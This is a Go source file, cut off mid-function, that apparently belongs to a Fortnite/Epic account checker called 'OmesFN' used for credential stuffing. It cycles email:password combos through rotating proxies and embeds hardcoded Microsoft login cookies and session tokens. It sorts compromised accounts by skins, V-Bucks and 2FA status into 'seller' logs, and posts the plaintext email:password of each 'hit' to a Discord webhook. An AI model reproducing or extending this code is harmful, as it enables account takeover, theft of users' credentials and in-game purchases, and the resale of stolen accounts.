package main
import (
    "bytes"
    "compress/gzip"
    "encoding/json"
    "fmt"
    "io"
    "io/ioutil"
    "math"
    // ...existing imports...
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "os"
    "path/filepath"
    "strconv"
    "strings"
    "sync"
    //"sync/atomic"
    "time"
)
var (
    Proxies []string
    proxyIndex int
    statsInstance *Stats
    statsOnce sync.Once
    cookieValue = "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPSoftVis=@:@; MSPRequ=id=N<=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; wlidperf=FR=L&ST=1701944522902; __Host-MSAAUTH=11-M.C513_BAY.0.U.CobRRcb!n3ZaE3R7CUG3Zxzz7S9vV6*He8j8ioTFhrnQhA0!EnthJ8gVyKWwD5BnEZ*6gAqKNh94mVlzaZJDD5XI5cahaiT6JvIOz1yjUEEjHui5gl5kGlFIIWknljQPcOrHfClmWwodrCLOj0nmiK4!0t8d7VdaNB5NWh5bf0t9r8NimP4yViKpZ9hF7mYSrnfdWWH73MAdL6DVAXAAxUwUdBhRQvB9BQtQOgP2r4we0Cg0pvxld3XcEX9lvnktJeC2WII2kq3ING4!WoPfpoM$; PPLState=1; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36a$uuid-dd8bae77-7811-4d1e-82dc-011f340afefe; OParams=11O.DvvtyHP50fqvq59j32mzNPWlpClyJTWqtEnFckOG878YtkueiF73Cvxi6BlMgWNJNKdCyKeNbY24lUdywNUISg2RtJ5SC77Fvn4f*Vh*RWznkt!lqPvRN9zj4aHa8GF9aku7tD5if2G!InhlLvSIrUnY5UEL1A*3s!CwU1wt*FFwKuuucB0sIkjug6SL1M9oy6LDisVNTM0usbaIq3Dr2pBl90Sine1GXhAblh0LY*8vm5Ik3gZXHpGOyoMKIo7RVtKqjzW8h1Er5dVp3JPKKMBbXT461WCpU4!!np4luPty*aWvxjPgjEz1jhTBqd0pU!8Gtk6xatvjSvlWjhoLQ8WbssxgZnFb5xqPByDvbFnCtR7xyQLHDpPRKBaXFcxfpRIoea0tAUrKuoCS2YEJEVW7Rd7!z2w0kNeWeQ*Cz*i8V2DVgj36xG8Lyy7rvf9orWPMGO4!Y0GRHBil!UpRJz!pTfonpO35XFokDHLTqzwOx7JqbB!eEMOxm6RWg7rQv0!s1xiTfrpCnOzswvf84aKIX4*x!e!5w1NaXrE*IkRWiLnyWCL4kXeIRVz998WXwd9VeJYRP8B5WSdOp6KDA5p7HgJrxzsZZJrBFIJjjkpIafjj!Rl60EYYtgxxGRQYH1QlsUYiNRV24m39P7RgoXIzj3Rvi2zVFKM3UQ!KRXSN804cr0SdDWDjg8yBQRS2h5P5VkUdMBksGAO2i!vmn7BY!r2wJQCbDn7v2eGjjonkyuRwXgRKKw34ME0TEVe7N3iQdoKZQcjtDhP5zdgG98cN!r5kJqatFG94Y3UDOSkoMYQw*kHV!QYK!EY5Hzmu61oKfHOrC5Ktuav7zEeUkGkHHhWgUxVKhSLtXyZ*uYe8D23WwRLnWilblWCpUjZxwksIg!cAUSVGr*kRlv7U37ydY!9y2gMtfdsYAMdR!vJ0*D9LtUkoRF6awqsyTRFJRsHZBcBO3874czjjgHOdHwBSGAgii5UEet!IgcBD!c4lKR5AGNQVKN!ndSCBGqtJKkMhh4mvpXSXjmAbA3ozLW6NcHcmTN5Vp!VQIWTbt9Y5SGWXbmajaxw60n1nCzxSztzFX!P!vrs9XEyKBWt5**r6iIw82PN5EDm5m7l19kpQBptXjmrbvmDZcRyY8k1krKI!FTyKY*t6Q7K1EpBQDDZFVxMOkRnCWCp*IVLa64y43Fak8tN1jmimudCCn4GDGig!luwlx6c!eNcnZazT*XuiHoIOUUMOHDdutNmRjUWNyE3Wuv*AtuMG1AF3361YFiY97ASELBaZpqQerCDayTYagBi4oxCVLQAM1!5oIHBe8v2LsxMTFXPMTSaMg5IzBOL9Uf6g8gw2dY8qKusNAnKzCKRS*qUkG5TmonufMI1dK4NlGz0mDka0kgfqclFCAmoUEx1ERI*jvTP*euv*rZ2P4mVYkd0Qlc4H77R9Htp6fKFIXb4jwoFkjkhPOW9LYFhAQymJXOk9QlQhrHJQriIT2Pr9vX0kY1xewxkbfhTgBR0XeFzTP18ToQGBuuN3GSfwesKHNyBOu3SAqVXZf4HEVcWtkcRD2pjm6VeK5wIDZPQUvQb4GSiKoreJwuR892wAxrfMAhanReoAuTiXj9Zr*2kw5kMWGhZkjCV7RiBHmk0MGHkUv!0pKezhjJNraldK2UbWlhLSWRbl2VMKTiL*aRON!0CtDQdL6ALNB8*i!VTEuUrAfs2RQp7SBZDHUQsTdv84NHjDKS0J*A1!kNt2O6X*g5cUOhOy*km0UuuDEQVsX8TIzbkMiNN0Bgwi*ed*HtP58Q1c5klOMeLifqivHoC0PpX3H2rE*xQXKKjFZEn04aReazKJBgQeNxSin!NLnyQn6Q590ZMuhmqs4o16MDpmumpCLhnPOerpG*cXbp8Q81wXNM3K8oh9whlDx7bI*3!o7zFoVobCxwx*aN9JfVLohNNrdArOtfuCwCIFlLjrgdIxhbVPKBTYkcN5CXB4a8ETpWZ87aSpRmS6DUclEf1Grxl*qm*EWxSjSpHX3whSxokpXQhtX*F*WSuGxv552RORocIaurFPTBldAXqnD3ucKuvM4zpcJ3vxSY0vBq9l01*tvwy*Gp3LhLMls0Ecy4cKGAYLNn*RE7hQZAE$"
    psRNGCSLKValue = "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQRzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgRvIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ"
    ppftValue = "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$"
    // Removed redeclaration of FailureKeywords. Use the version from variables.go
    Vbucks1kPlus int64
    Vbucks3kPlus int64
)
func getProxyClient() *http.Client {
    proxyURL := ""
    if len(Proxies) > 0 {
        proxyIndex = (proxyIndex + 1) % len(Proxies)
        proxyURL = Proxies[proxyIndex]
        if !strings.Contains(proxyURL, "://") {
            proxyURL = "http://" + proxyURL
        }
    }
    transport := &http.Transport{}
    if proxyURL != "" {
        urlParsed, err := url.Parse(proxyURL)
        if err == nil {
            transport.Proxy = http.ProxyURL(urlParsed)
        }
    }
    return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}
func initDebugLog() {
    if DebugMode {
        debugFile, err2 := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err2 == nil {
            defer debugFile.Close()
            sessionHeader := fmt.Sprintf("\n=== DEBUG SESSION STARTED: %s ===\n", time.Now().Format("2006-01-02 15:04:05"))
            debugFile.WriteString(sessionHeader)
            fmt.Print(sessionHeader)
        }
    }
}
func debugLog(format string, args ...interface{}) {
    if DebugMode {
        message := fmt.Sprintf(format, args...)
        timestamp := time.Now().Format("2006-01-02 15:04:05.000")
        logEntry := fmt.Sprintf("[%s] [DEBUG] %s\n", timestamp, message)
        fmt.Print(logEntry)
        debugFile, err2 := os.OpenFile("debug_responses.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err2 == nil {
            defer debugFile.Close()
            debugFile.WriteString(logEntry)
        }
    }
}
func checkRareSkins(skinsList string, rawSkinsList []string) (bool, []string, []string) {
    hasOgRare := false
    ogSkinsFound := []string{}
    rareSkinsFound := []string{}
    skins := strings.Split(skinsList, ",")
    for i, skin := range skins {
        rawSkinID := ""
        if i < len(rawSkinsList) {
            rawSkinID = rawSkinsList[i]
        }
        if rawSkinID != "" {
            for _, ogSkin := range strings.Split(OGRaresList, ",") {
                if strings.Contains(skin, strings.TrimSpace(ogSkin)) {
                    hasOgRare = true
                    ogSkinsFound = append(ogSkinsFound, strings.TrimSpace(ogSkin))
                }
            }
            for _, rareSkin := range strings.Split(RaresList, ",") {
                if strings.Contains(skin, strings.TrimSpace(rareSkin)) {
                    rareSkinsFound = append(rareSkinsFound, strings.TrimSpace(rareSkin))
                }
            }
        }
    }
    return hasOgRare, ogSkinsFound, rareSkinsFound
}
const (
    Reset = "\033[0m"
    Red = "\033[31m"
    Green = "\033[32m"
    Yellow = "\033[33m"
    Blue = "\033[34m"
    Purple = "\033[35m"
    Cyan = "\033[36m"
    White = "\033[37m"
)
type DebugLogger struct {
    email string
    task string
    file *os.File
}
func NewDebugLogger(email, task string) *DebugLogger {
    filename := fmt.Sprintf("%s_%s_debug.log", strings.Split(email, ":")[0], task)
    file, err2 := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return nil
    }
    logger := &DebugLogger{
        email: email,
        task: task,
        file: file,
    }
    logger.file.WriteString(fmt.Sprintf("=== %s Debug Log for %s ===\n", task, email))
    logger.file.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))
    logger.file.WriteString("========================================\n")
    return logger
}
func (dl *DebugLogger) Log(format string, args ...interface{}) {
    if dl == nil || dl.file == nil {
        return
    }
    timestamp := time.Now().Format("15:04:05.000")
    message := fmt.Sprintf("[%s] %s\n", timestamp, fmt.Sprintf(format, args...))
    dl.file.WriteString(message)
}
func (dl *DebugLogger) Close() {
    if dl != nil && dl.file != nil {
        dl.file.WriteString("========================================\n\n")
        dl.file.Close()
    }
}
func decompressGzip(data []byte) ([]byte, error) {
    if len(data) == 0 {
        return data, nil
    }
    reader, err2 := gzip.NewReader(bytes.NewReader(data))
    if err2 != nil {
        return data, err2
    }
    defer reader.Close()
    return io.ReadAll(reader)
}
func readResponseBody(resp2 *http.Response) (string, error) {
    bodyBytes, err2 := ioutil.ReadAll(resp2.Body)
    if err2 != nil {
        return "", err2
    }
    contentEncoding := resp2.Header.Get("Content-Encoding")
    if strings.Contains(strings.ToLower(contentEncoding), "gzip") {
        decompressed, err2 := decompressGzip(bodyBytes)
        if err2 != nil {
            return string(bodyBytes), nil
        }
        return string(decompressed), nil
    }
    return string(bodyBytes), nil
}
type Stats struct {
    sessionFolder string
    zeroSkinSellerLog []string
    oneSkinSellerLog []string
    tenSkinSellerLog []string
    twentyFiveSkinSellerLog []string
    fiftySkinSellerLog []string
    hundredSkinSellerLog []string
    hundredFiftySkinSellerLog []string
    twoHundredSkinSellerLog []string
    twoHundredFiftySkinSellerLog []string
    threeHundredSkinSellerLog []string
    raresAndExclusivesSellerLog []string
}
func GetStats() *Stats {
    statsOnce.Do(func() {
        statsInstance = &Stats{}
    })
    return statsInstance
}
func logResponseToFile(acc, endpoint, content string) {
    filename := fmt.Sprintf("%s_%s_response.json", strings.Split(acc, ":")[0], endpoint)
    _ = os.WriteFile(filename, []byte(content), 0644)
}
func logRequestResponse(email, endpoint, method, url string, headers map[string]string, requestBody, responseBody string, statusCode int) {
    timestamp := time.Now().Format("2006-01-02_15-04-05")
    filename := fmt.Sprintf("%s_%s_%s_request.log", email, endpoint, timestamp)
    logContent := fmt.Sprintf("=== REQUEST LOG ===\n")
    logContent += fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05.000"))
    logContent += fmt.Sprintf("Email: %s\n", email)
    logContent += fmt.Sprintf("Endpoint: %s\n", endpoint)
    logContent += fmt.Sprintf("Method: %s\n", method)
    logContent += fmt.Sprintf("URL: %s\n", url)
    logContent += fmt.Sprintf("\n--- REQUEST HEADERS ---\n")
    for key, value := range headers {
        logContent += fmt.Sprintf("%s: %s\n", key, value)
    }
    logContent += fmt.Sprintf("\n--- REQUEST BODY ---\n")
    if requestBody != "" {
        logContent += requestBody + "\n"
    } else {
        logContent += "(empty)\n"
    }
    logContent += fmt.Sprintf("\n--- RESPONSE ---\n")
    logContent += fmt.Sprintf("Status Code: %d\n", statusCode)
    logContent += fmt.Sprintf("\n--- RESPONSE BODY ---\n")
    logContent += responseBody + "\n"
    logContent += fmt.Sprintf("\n=== END LOG ===\n\n")
    _ = os.WriteFile(filename, []byte(logContent), 0644)
}
func (s *Stats) getSessionFolder() string {
    if s.sessionFolder == "" {
        timestamp := time.Now().Format("20060102_150405")
        s.sessionFolder = fmt.Sprintf("OmesFN_%s", timestamp)
        baseDir := filepath.Join("Results", s.sessionFolder)
        if err2 := os.MkdirAll(baseDir, 0755); err2 != nil {
            s.sessionFolder = fmt.Sprintf("err_%d", time.Now().Unix())
            baseDir = filepath.Join("Results", s.sessionFolder)
            _ = os.MkdirAll(baseDir, 0755)
        }
    }
    return s.sessionFolder
}
func (s *Stats) ExportBads(acc, reason string) {
    ExportLock.Lock()
    defer ExportLock.Unlock()
    AddToBad(1)
    AddToCheck(1)
    DecrementJobs(1)
    FailureReasonsMutex.Lock()
    FailureReasons = append(FailureReasons, fmt.Sprintf("%s -> %s", acc, reason))
    FailureReasonsMutex.Unlock()
}
func (s *Stats) ExportRetries(acc string, responseText string, incrementRetries bool) {
    ExportLock.Lock()
    defer ExportLock.Unlock()
    // LogWarning(fmt.Sprintf("Retrying %s. Reason: %s", acc, responseText))
    WorkWg.Add(1)
    if !incrementRetries {
        Combos <- acc
    } else {
        AddToRetries(1)
        Combos <- acc
        if responseText == "" {
            responseText = "No response"
        }
        f, err2 := os.OpenFile("error_log.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err2 == nil {
            defer f.Close()
            _, _ = f.WriteString(fmt.Sprintf("%s | response: %s\n", acc, responseText))
        }
    }
}
func (s *Stats) ExportSkins(acc, displayName string, skinCount int, skinsList, epicEmail, twofaStatus, psn, nintendo, emailVerified, vbucksCount, alternateMethods, lastPlayed string, isMaybeFa, hasStw bool) {
    folderID := s.getSessionFolder()
    AddToCheck(1)
    DecrementJobs(1)
    categories := []struct {
        minSkins int
        maxSkins int
        varUpdater func(int64)
        logList *[]string
        fileName string
    }{
        {0, 0, AddToZeroSkin, &s.zeroSkinSellerLog, "0_skins.txt"},
        {1, 9, AddToOnePlus, &s.oneSkinSellerLog, "1-9_skins.txt"},
        {10, 49, AddToTenPlus, &s.tenSkinSellerLog, "10+_skins.txt"},
        {50, 99, AddToFiftyPlus, &s.fiftySkinSellerLog, "50+_skins.txt"},
        {100, 199, AddToHundredPlus, &s.hundredSkinSellerLog, "100+_skins.txt"},
        {200, 299, AddToTwoHundredPlus, &s.twoHundredSkinSellerLog, "200+_skins.txt"},
        {300, math.MaxInt32, AddToThreeHundredPlus, &s.threeHundredSkinSellerLog, "300+_skins.txt"},
    }
    faString := "No"
    if isMaybeFa {
        faString = "Yes"
    }
    outputLine := fmt.Sprintf("Account: %s | Display Name: %s | Skin Count: %d | Epic Email: %s | Has STW: %t | 2FA Status: %s | 2FA Methods: %s | Last Played: %s | PSN: %s | Nintendo: %s | Email Verified: %s | V-Bucks: %s | FA: %s | Skins: %s\n",
        acc, displayName, skinCount, epicEmail, hasStw, twofaStatus, alternateMethods, lastPlayed, psn, nintendo, emailVerified, vbucksCount, faString, skinsList)
    var categoryFile string
    for _, cat := range categories {
        if skinCount >= cat.minSkins && skinCount <= cat.maxSkins {
            cat.varUpdater(1)
            categoryFile = filepath.Join("Results", folderID, cat.fileName)
            break
        }
    }
    if categoryFile != "" {
        f, err2 := os.OpenFile(categoryFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err2 == nil {
            defer f.Close()
            _, _ = f.WriteString(outputLine)
        }
    }
    sellerLogEntry := fmt.Sprintf("Epic Email: %s | FA: %s | Email Verified: %s | 2FA Methods: %s | V-Bucks: %s | Skin Count: %d | Last Played: %s | PSN Connectable: %s | Nintendo Connectable: %s | Skins: %s",
        epicEmail, faString, emailVerified, alternateMethods, vbucksCount, skinCount, lastPlayed, psn, nintendo, skinsList)
    for _, cat := range categories {
        if skinCount >= cat.minSkins && skinCount <= cat.maxSkins {
            *cat.logList = append(*cat.logList, fmt.Sprintf("%s | %s", acc, sellerLogEntry))
            break
        }
    }
}
func (s *Stats) ExportStats(acc string) {
    folderID := s.getSessionFolder()
    categories := []string{
        "0_skins.txt", "1-9_skins.txt", "10+_skins.txt", "50+_skins.txt",
        "100+_skins.txt", "200+_skins.txt", "300+_skins.txt",
    }
    for _, fileName := range categories {
        filePath := filepath.Join("Results", folderID, fileName)
        content, err2 := os.ReadFile(filePath)
        if err2 != nil {
            continue
        }
        lines := strings.Split(string(content), "\n")
        found := false
        for i := len(lines) - 1; i >= 0; i-- {
            if strings.Contains(lines[i], acc) && strings.HasPrefix(lines[i], "Account:") {
                lines[i] = strings.TrimSpace(lines[i])
                found = true
                break
            }
        }
        if found {
            output := strings.Join(lines, "\n")
            _ = os.WriteFile(filePath, []byte(output), 0644)
            break
        }
    }
}
func (s *Stats) ExportSellerLog() {
    folderID := s.getSessionFolder()
    sellerFilePath := filepath.Join("Results", folderID, "seller_log.txt")
    sortedFilePath := filepath.Join("Results", folderID, "sorted_log.txt")
    sellerFile, err2 := os.OpenFile(sellerFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return
    }
    defer sellerFile.Close()
    sortedFile, err2 := os.OpenFile(sortedFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return
    }
    defer sortedFile.Close()
    writeLogSection := func(title string, log []string) {
        if len(log) > 0 {
            ExportLock.Lock()
            defer ExportLock.Unlock()
            _, _ = sellerFile.WriteString(fmt.Sprintf("==================== %s ====================\n", title))
            _, _ = sortedFile.WriteString(fmt.Sprintf("==================== %s ====================\n", title))
            for _, entry := range log {
                parts := strings.SplitN(entry, " | ", 2)
                if len(parts) == 2 {
                    _, _ = sellerFile.WriteString(parts[1] + "\n")
                }
                _, _ = sortedFile.WriteString(entry + "\n")
            }
        }
    }
    writeLogSection("Exclusives & Ogs", s.raresAndExclusivesSellerLog)
    writeLogSection("0 Skins", s.zeroSkinSellerLog)
    writeLogSection("1+ Skins", s.oneSkinSellerLog)
    writeLogSection("10+ Skins", s.tenSkinSellerLog)
    writeLogSection("25+ Skins", s.twentyFiveSkinSellerLog)
    writeLogSection("50+ Skins", s.fiftySkinSellerLog)
    writeLogSection("100+ Skins", s.hundredSkinSellerLog)
    writeLogSection("150+ Skins", s.hundredFiftySkinSellerLog)
    writeLogSection("200+ Skins", s.twoHundredSkinSellerLog)
    writeLogSection("250+ Skins", s.twoHundredFiftySkinSellerLog)
    writeLogSection("300+ Skins", s.threeHundredSkinSellerLog)
}
func saveVbucksHitExtended(
    acc, displayName, epicEmail, alternateMethodsStr, lastPlayed string,
    totalVbucks int, hasStw bool,
) {
    entry := fmt.Sprintf(
        "Account: %s | Display Name: %s | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s",
        acc, displayName, totalVbucks, epicEmail, alternateMethodsStr, hasStw, lastPlayed,
    )
    saveVbucksHit(entry, totalVbucks)
}
func sendDiscordWebhookForExclusive(acc, displayName, skinsList, exclusiveReason, epicEmail, alternateMethods, lastPlayed string, totalVbucks, skinCount int, hasStw bool) {
    if DiscordWebhookURL == "" {
        return
    }
    creds := strings.SplitN(acc, ":", 2)
    email := creds[0]
    password := ""
    if len(creds) > 1 {
        password = creds[1]
    }
    skinsValue := fmt.Sprintf("`%d Skins`", skinCount)
    if exclusiveReason == "Exclusive Skins" {
        skinsValue = fmt.Sprintf("`Exclusive skins: %s`", skinsList)
    } else if exclusiveReason == "OG Skins" {
        skinsValue = fmt.Sprintf("`OG skins: %s`", skinsList)
    }
    payload := map[string]interface{}{
        "embeds": []map[string]interface{}{
            {
                "title": "🎉 Exclusive Fortnite Hit!",
                "color": 0x00ff00,
                "fields": []map[string]interface{}{
                    {
                        "name": "💰 Account",
                        "value": fmt.Sprintf("`%s:%s`", email, password),
                        "inline": false,
                    },
                    {
                        "name": "👤 Display Name",
                        "value": fmt.Sprintf("`%s`", displayName),
                        "inline": true,
                    },
                    {
                        "name": "📧 Epic Email",
                        "value": fmt.Sprintf("`%s`", epicEmail),
                        "inline": true,
                    },
                    {
                        "name": "🎨 Skins",
                        "value": skinsValue,
                        "inline": false,
                    },
                    {
                        "name": "🎯 Exclusive Trigger",
                        "value": fmt.Sprintf("`%s`", exclusiveReason),
                        "inline": true,
                    },
                    {
                        "name": "💎 V-Bucks",
                        "value": fmt.Sprintf("`%d`", totalVbucks),
                        "inline": true,
                    },
                    {
                        "name": "🔐 2FA Methods",
                        "value": fmt.Sprintf("`%s`", alternateMethods),
                        "inline": true,
                    },
                    {
                        "name": "🌐 Has STW",
                        "value": fmt.Sprintf("`%t`", hasStw),
                        "inline": true,
                    },
                    {
                        "name": "⏰ Last Played",
                        "value": fmt.Sprintf("`%s`", lastPlayed),
                        "inline": true,
                    },
                    {
                        "name": "📅 Captured At",
                        "value": fmt.Sprintf("`%s`", time.Now().Format("2006-01-02 15:04:05")),
                        "inline": true,
                    },
                },
                "footer": map[string]interface{}{
                    "text": "OmesFN Exclusive Hit",
                },
            },
        },
    }
    payloadBytes, err := json.Marshal(payload)
    if err != nil {
        LogError(fmt.Sprintf("Failed to marshal Discord webhook payload: %v", err))
        return
    }
    resp, err := http.Post(DiscordWebhookURL, "application/json", bytes.NewBuffer(payloadBytes))
    if err != nil {
        LogError(fmt.Sprintf("Failed to send Discord webhook: %v", err))
        return
    }
    defer resp.Body.Close()
    if resp.StatusCode != 204 {
        LogError(fmt.Sprintf("Discord webhook returned status code %d", resp.StatusCode))
    }
}
func sendDiscordWebhookForHit(acc, displayName, skinsCountStr, epicEmail, alternateMethods, lastPlayed string, totalVbucks int, hasStw bool, twofaStatus string) {
    if DiscordWebhookURL == "" {
        return
    }
    creds := strings.SplitN(acc, ":", 2)
    email := creds[0]
    password := ""
    if len(creds) > 1 {
        password = creds[1]
    }
    payload := map[string]interface{}{
        "embeds": []map[string]interface{}{
            {
                "title": "✅ Fortnite Hit Found!",
                "color": 0x3498db,
                "fields": []map[string]interface{}{
                    {
                        "name": "💰 Account",
                        "value": fmt.Sprintf("`%s:%s`", email, password),
                        "inline": false,
                    },
                    {
                        "name": "👤 Display Name",
                        "value": fmt.Sprintf("`%s`", displayName),
                        "inline": true,
                    },
                    {
                        "name": "📧 Epic Email",
                        "value": fmt.Sprintf("`%s`", epicEmail),
                        "inline": true,
                    },
                    {
                        "name": "🎨 Skins",
                        "value": fmt.Sprintf("`%s`", skinsCountStr),
                        "inline": false,
                    },
                    {
                        "name": "💎 V-Bucks",
                        "value": fmt.Sprintf("`%d`", totalVbucks),
                        "inline": true,
                    },
                    {
                        "name": "🔐 2FA Status",
                        "value": fmt.Sprintf("`%s`", twofaStatus),
                        "inline": true,
                    },
                    {
                        "name": "🌐 Has STW",
                        "value": fmt.Sprintf("`%t`", hasStw),
                        "inline": true,
                    },
                    {
                        "name": "⏰ Last Played",
                        "value": fmt.Sprintf("`%s`", lastPlayed),
                        "inline": true,
                    },
                    {
                        "name": "📅 Captured At",
                        "value": fmt.Sprintf("`%s`", time.Now().Format("2006-01-02 15:04:05")),
                        "inline": true,
                    },
                },
                "footer": map[string]interface{}{
                    "text": "OmesFN Hit",
                },
            },
        },
    }
    payloadBytes, err := json.Marshal(payload)
    if err != nil {
        LogError(fmt.Sprintf("Failed to marshal Discord webhook payload: %v", err))
        return
    }
    resp, err := http.Post(DiscordWebhookURL, "application/json", bytes.NewBuffer(payloadBytes))
    if err != nil {
        LogError(fmt.Sprintf("Failed to send Discord webhook: %v", err))
        return
    }
    defer resp.Body.Close()
    if resp.StatusCode != 204 {
        LogError(fmt.Sprintf("Discord webhook returned status code %d", resp.StatusCode))
    }
}
func (s *Stats) ExportExclusive(acc, displayName, skinsList, exclusiveReason, epicEmail, alternateMethods, lastPlayed string, totalVbucks, skinCount int, hasStw bool) {
    folderID := s.getSessionFolder()
    filePath := filepath.Join("Results", folderID, "exclusives.txt")
    f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return
    }
    defer f.Close()
    line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %s | Exclusive Reason: %s | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
        acc, displayName, skinsList, exclusiveReason, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
    _, _ = f.WriteString(line)
    if DiscordWebhookURL != "" {
        sendDiscordWebhookForExclusive(acc, displayName, skinsList, exclusiveReason, epicEmail, alternateMethods, lastPlayed, totalVbucks, skinCount, hasStw)
    }
    sellerLogEntry := fmt.Sprintf("Epic Email: %s | Exclusive: %s | V-Bucks: %d | 2FA Methods: %s | STW: %t | Last Played: %s",
        epicEmail, exclusiveReason, totalVbucks, alternateMethods, hasStw, lastPlayed)
    s.raresAndExclusivesSellerLog = append(s.raresAndExclusivesSellerLog, acc+" | "+sellerLogEntry)
}
func (s *Stats) ExportHeadless(acc, displayName, epicEmail, alternateMethods, lastPlayed string, skinCount, totalVbucks int, hasStw bool) {
    ExportLock.Lock()
    defer ExportLock.Unlock()
    AddToCheck(1)
    DecrementJobs(1)
    folderID := s.getSessionFolder()
    filePath := filepath.Join("Results", folderID, "headless.txt")
    f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return
    }
    defer f.Close()
    line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %d | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
        acc, displayName, skinCount, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
    _, _ = f.WriteString(line)
}
func (s *Stats) ExportFA(acc, displayName string, skinCount, totalVbucks int, epicEmail, alternateMethods string, hasStw bool, lastPlayed string) {
    folderID := s.getSessionFolder()
    filePath := filepath.Join("Results", folderID, "fa.txt")
    f, err2 := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err2 != nil {
        return
    }
    defer f.Close()
    line := fmt.Sprintf("Account: %s | Display Name: %s | Skins: %d | V-Bucks: %d | Epic Email: %s | 2FA Methods: %s | STW: %t | Last Played: %s\n",
        acc, displayName, skinCount, totalVbucks, epicEmail, alternateMethods, hasStw, lastPlayed)
    _, _ = f.WriteString(line)
}
func (s *Stats) ExportHit(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, twofaStatus, skinsList string, skinCount, totalVbucks int, hasStw, isHeadless bool, ogSkinsFound, rareSkinsFound []string) {
    creds := strings.SplitN(acc, ":", 2)
    email := creds[0]
    password := ""
    if len(creds) > 1 {
        password = creds[1]
    }
    qualityScore := calculateAccountQuality(skinCount, totalVbucks, hasStw, len(ogSkinsFound) > 0, len(rareSkinsFound) > 0, twofaStatus)
    if qualityScore >= 80 {
        autoSaveHit(fmt.Sprintf("%s:%s", email, password), qualityScore)
    }
    saveVbucksHitExtended(acc, displayName, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, hasStw)
    isExclusive := false
    if len(ogSkinsFound) > 0 {
        exclusiveReason := "OG Skins"
        s.ExportExclusive(acc, displayName, strings.Join(ogSkinsFound, ", "), exclusiveReason, epicEmail, alternateMethodsStr, lastPlayed, totalVbucks, skinCount, hasStw)
